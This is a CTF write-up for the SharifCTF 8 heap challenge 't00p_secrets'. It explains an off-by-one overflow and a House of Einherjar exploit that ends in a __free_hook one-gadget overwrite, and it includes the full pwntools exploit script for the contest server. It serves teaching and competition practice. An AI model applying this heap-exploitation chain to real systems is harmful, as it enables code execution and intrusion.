---
title: SharifCTF 8 - t00p_secrets
date: '2018-02-04'
lastmod: '2019-04-07T13:46:27+02:00'
categories:
- writeup
- sharifctf18
tags:
- pwn
authors:
- malweisse
---

Decompiling the binary we can discover the master key.
Running the program the output is this:

```sh
$ ./t00p_secrets
Welcome to SUCTF secret management service
Enter your master key: wjigaep;r[jg]ahrg[es9hrg
1. Create a secret
2. Delete a secret
3. Edit a secret
4. Print secret
5. Print a secret
6. Exit
>
```

There are six options: create, delete, edit... ok it's a heap pwn.

Exploring the create and edit options we can see that the content of a secret can be a string or a binary data.

The function that reads the content of a secret is the following:

```c
__int64 __fastcall read_content(void *dest, signed __int64 size, __int16 is_string)
{
  __int16 v4; // [rsp+Ch] [rbp-24h]
  unsigned int v5; // [rsp+24h] [rbp-Ch]

  v4 = is_string;
  if ( size > 0 )
  {
    v5 = read(0, dest, size);
    if ( v4 )
      *((_BYTE *)dest + v5) = 0; //overflow if v5==size
  }
  return 0LL;
}
```

Note: dest is a buffer allocated with `malloc(size)`.

The bug is here. If the user choice is that a secret content is a string there is an off-by-one overflow due to the string terminator.

House of Einherjar can be used to force malloc to return a pointer near an area where you can write.

The idea is to force malloc to return a pointer near the global variable `ptr + 0xA` in .data (where the program stores the pointers to the secrets contents) so we can write the address of `__free_hook` (not a GOT entry beacause there is Full RELRO) in that area and then use edit to write in `__free_hook`.

Firstly I used the overflow to crash the program and retrieve some offsets of libc symbols from the crash dump.

```python
create(0, 24)
create(1, 24)
edit(0, "a"*24) #overflow, write 0 to the last byte of the size field in the chunck 1
delete(1) #free search for a free chunck in [address of 1] + 0xaaaaaaaa, so it crashes with 'free(): invalid pointer'
```

Using libc database I found that the service is using libc6_2.23-0ubuntu10_amd64.so.

Let's write the exploit.

In the main procedure we can see that there is an hidden option, the seventh, that can be used to change the master key (24 bytes).

The master key is in data, above our target `ptr + 0xA`.

Perfect.

I used master key to forge a fake chunck. But there is a problem: a malloc chunck is 48 bytes.

So i decided to put in master_k only a part of the chunck, size + fd + bk.

```c
struct malloc_chunk {
    INTERNAL_SIZE_T         prev_size;
    INTERNAL_SIZE_T         size; //set to 0
    struct malloc_chunk*    fd; //set to fake chunck address (master_k -8)
    struct malloc_chunk*    bk; //set to fake chunck address (master_k -8)
    struct malloc_chunk*    fd_nextsize;
    struct malloc_chunk*    bk_nextsize;
};
```

To prevent a corrupted prev_size vs. size crash also the other fields must be setted to 0.

But `master_k`, after the program start, is -1. `fd_nextsize` and `bk_nextsize` are 0, but if I used the secrets 0 and 1 they will be dirty.

Before master_k the program writes the size of each secret. So to have a valid fake chunck we must do two things:

+ never allocate the 0 and 1 secrets (whe have other 6 slots to use)
+ create the secret 7 with size 0, so prev_size is 0

Ok now to force free to consider the fake chunck a valid free chunck we must have the offset between the overflowed chunck and the fake chunck.

An heap leak is needed.

Fortunately when a secret is deleted the heap is not cleared, so we can leak the fd pointer allocating a previous free chunk.

```python
create(2, 24)
create(3, 248)
create(4, 24)
delete(2)
delete(4)
create(4, 24, val="")

heap_leak = "\x20" + print_one(4)[1:8] #fd pointer of the secret 4 points to the secret 2 (0x20 is needed because the last byte is overwritted by newline)
```

The chunck that will be manipulated is the second (secret 3), at address `heap_leak + 24`.

Using edit we set the prev_size of this chunck to the offset between it and the fake chunck.

Calling delete on it will force malloc to use the fake chunck as the next chunck to be allocated (if the size match).

We must change again master_k to set the fake chunck size to 0x100.

Now `malloc(248)` returns the fake chunck address + 16.

OKKKK whe can write on the memory after master_k now! Specifically in `ptr + 0xA`.

But before we need a lib leak.

Just print the new chunck to get an address from the main arena (free has rewritten fd with it).

The last phase is to overwrite the pointer to already created secret content with `__free_hook`, use edit and write the magic gadget address in `__free_hook`, call free and win.

Download the binary [here](/sharifctf18/t00p_secrets).
Full exploit code:

```python
#TheRomanXpl0it - malweisse

from pwn import *
import sys

#########################################################
BINARY="./t00p_secrets"
HOST="ctf.sharif.edu"
PORT=22107
ENV={"LD_PRELOAD":"./libc6_2.23-0ubuntu10_amd64.so"}
GDB=""
#########################################################

if len(sys.argv) < 2:
    print "args: bin|net|crash|ida|gdb\n"
    sys.exit(1)

if sys.argv[1] == "bin":
    p = process(BINARY, env=ENV)
elif sys.argv[1] == "net" or sys.argv[1] == "crash":
    p = remote(HOST, PORT)
elif sys.argv[1] == "ida":
    p = process("./linux_server64", env=ENV)
    p.recvuntil("0.1...")
elif sys.argv[1] == "gdb":
    p = process(BINARY, env=ENV)
    gdb.attach(p, GDB)
else:
    print "args: bin|net|crash|ida|gdb\n"
    sys.exit(1)


def create(idx, size, val="0"):
    print p.recvuntil("> ")
    p.sendline("1")
    print p.recvuntil(": ")
    p.sendline(str(idx))
    print p.recvuntil(": ")
    p.sendline(str(size))
    print p.recvuntil(": ")
    p.sendline("0") #binary
    print p.recvuntil(": ")
    p.sendline(val)
    print " >> %d created" % idx

def delete(idx):
    print p.recvuntil("> ")
    p.sendline("2")
    print p.recvuntil(": ")
    p.sendline(str(idx))

def edit(idx, val, b="1"):
    print p.recvuntil("> ")
    p.sendline("3")
    print p.recvuntil(": ")
    p.sendline(str(idx))
    print p.recvuntil(": ")
    p.sendline(b) #string
    print p.recvuntil(": ")
    p.sendline(val)

def print_one(idx):
    print p.recvuntil("> ")
    p.sendline("5")
    print p.recvuntil(": ")
    p.sendline(str(idx))
    print p.recvline(False)
    print p.recvuntil(": ")
    r = p.recvuntil("-----***-----")
    print r
    return r

def change_key(k):
    print p.recvuntil("> ")
    p.sendline("7")
    print p.recvuntil(": ")
    p.sendline(k)
    print p.recvuntil(": ")
    p.sendline(k)


print p.recvuntil("key: ")
p.sendline("wjigaep;r[jg]ahrg[es9hrg")

if sys.argv[1] == "crash": #use offsets in dump to discover the libc version
    create(0,24)
    create(1,24)
    edit(0, "a"*24)
    delete(1)

    print p.recvall()
    p.close()
    sys.exit(0)

### PHASE 1 - CRAFT FAKE CHUNCK ###

master_k = 0x06020A0

fake_chunk_addr = master_k -8
fake_chunk_from_size = p64(0) + p64(fake_chunk_addr) + p64(fake_chunk_addr)

change_key(fake_chunk_from_size)

print " >> fake chunck addr: " + hex(fake_chunk_addr)

### PHASE 2 - HEAP LEAK ###

create(2,24)
create(3,248, val="BBB")
create(4,24)
delete(2)
delete(4)
create(4,24, val="")

heap_leak = "\x20" + print_one(4)[1:8]
first_addr = u64(heap_leak)
print " >> first addr: " + hex(first_addr)

second_addr = first_addr + 32

### PHASE 3 - PREPARE FAKE CHUNCK ###

create(2,24, val="AAAA")

create(7,0, val="") #clear fake_chunk[0]

### PHASE 4 - OFF BY ONE OVERFLOW ###

off = fake_chunk_addr - (second_addr -16)
print " >>> new prev_size: " + hex(-off)
edit(2,"a"*16+p64(-off))

delete(3) #trigger

### PHASE 5 - MALLOC RETURN FAKE_CHUNK + 16 ###

fake_chunk_from_size = p64(0x100) + p64(fake_chunk_addr) + p64(fake_chunk_addr)
change_key(fake_chunk_from_size)

create(3, 248 , val="")

forged = fake_chunk_addr + 16 #now 3 is master_k+8

### PHASE 5 - LIBC LEAK FROM ARENA ###

libc_leak = print_one(3)[:8]
libc_addr = u64(libc_leak) - 0x3c4b0a
print " >> libc addr: " + hex(libc_addr)

ptr_2 = 0x00602068 + (2+0xa)*8
print " >> ptr secret 2: " + hex(ptr_2)

libc = ELF("libc6_2.23-0ubuntu10_amd64.so")

### PHASE 6 - REWRITE POINTER WITH FREE_HOOK ###

edit(3, "\0"*(ptr_2 - forged) + p64(libc_addr + libc.symbols["__free_hook"]), b="0")

### PHASE 7- WRITE THE ONE CALL GADGET ADDRESS IN FREE_HOOK ###

magic = libc_addr + 0x0000000004526a
edit(2, p64(magic), b="0")

### PHASE 8 - PWN ###

delete(7) #WIN

p.interactive()

```
